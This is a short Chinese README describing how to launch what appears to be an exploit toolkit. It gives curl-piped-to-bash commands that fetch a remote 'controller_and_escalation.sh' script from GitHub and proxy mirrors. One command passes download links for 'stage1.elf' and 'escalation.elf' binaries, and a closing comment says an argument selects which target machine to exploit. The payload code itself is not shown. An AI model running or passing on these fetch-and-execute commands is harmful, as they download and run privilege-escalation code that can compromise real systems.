# 启动方式

```bash
curl -fsSL https://raw.githubusercontent.com/Jerryy959/controller/refs/heads/main/controller_and_escalation.sh | bash -s -- test 2>&1 | tee /tmp/controller.log
curl -fsSL https://gh-proxy.org/https://raw.githubusercontent.com/Jerryy959/controller/refs/heads/main/controller_and_escalation.sh | bash -s -- test 2>&1 | tee /tmp/controller.log
```

```bash
curl -fsSL https://hk.gh-proxy.org/https://github.com/Jerryy959/controller/releases/download/v1/controller.sh \
  | bash -s -- \
      "https://github.com/Jerryy959/controller/releases/download/v1/stage1.elf" \
      "https://github.com/Jerryy959/controller/releases/download/v1/escalation.elf" \
  2>&1 | tee /tmp/controller.log
```

```bash

curl xxx.sh $0
```

# 这里$0 的作用是选择某个机器进行 exploit，一个是 org，一个是 haoc，一个是 ubuntu
